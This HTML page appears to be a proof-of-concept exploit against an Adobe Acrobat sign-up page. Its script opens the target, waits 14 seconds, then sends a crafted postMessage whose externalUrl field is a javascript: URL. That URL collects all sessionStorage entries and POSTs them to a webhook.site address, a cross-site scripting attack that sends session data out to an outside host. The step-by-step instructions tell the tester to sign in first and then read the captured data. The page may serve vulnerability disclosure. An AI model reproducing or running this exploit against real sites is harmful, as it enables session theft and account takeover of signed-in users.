<!DOCTYPE html
<html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Window Opener</title>
  </head>
  <body>
    <h1>Window Opener and Message Sender</h1>
    <p>Click "Open Window" to open the Adobe URL in a new window and automatically send the message after 10 seconds.</p>
    <ol>
      <li>Sign in to Adobe account</li>
      <li>Input one of the URLs below</li>
      <ol>
        <li>https://www.adobe.com/acrobat/business/sign.html?fromES=true#mini-plans-web-cta-acrobat-pro-teams-card</li>
        <li>https://mwpw-182221-3in1-xss--milo--mirafedas.aem.page/drafts/mirafedas/3in1-test-page#mini-plans-web-cta-illustrator-card</li>
      </ol>
      <li>Click "Open Window"</li>
      <li>Wait for 14 seconds</li>
      <li>Check the https://webhook.site/3444004f-f792-4702-8e8f-65bbc886712f for the sessionStorage data</li>
    </ol>

    <form action="">
      <input type="text" name="url" id="url" placeholder="Page URL">
      <button id="openButton">Open Window</button>
    </form>

    <script>
      let childWindow = null;
      let webhookUrl = 'https://webhook.site/3444004f-f792-4702-8e8f-65bbc886712f';
      
      document.getElementById('openButton').addEventListener('click', () => {
      childWindow = window.open('https://www.adobe.com/acrobat/business/sign.html?fromES=true#mini-plans-web-cta-acrobat-pro-teams-card', '_blank');
      if (childWindow) {
      setTimeout(() => {
        console.log('message sent');
      if (childWindow && !childWindow.closed) {
      const message = JSON.stringify({
      app: 'ucv3',
      subType: 'EXTERNAL',
      data: {
      externalUrl: `javascript:(function(){let data={};for(let i=0;i<sessionStorage.length;i++)
      
      {let k=sessionStorage.key(i);data[k]=sessionStorage.getItem(k);}
      fetch("${webhookUrl}",
      
      {method:"POST",body:JSON.stringify(data)}
      );})();`,
      target: '_blank'
      }
      });
      childWindow.postMessage(message, '*');
      }
      }, 14000);
      }
      });
      </script>
      </body>
      </html>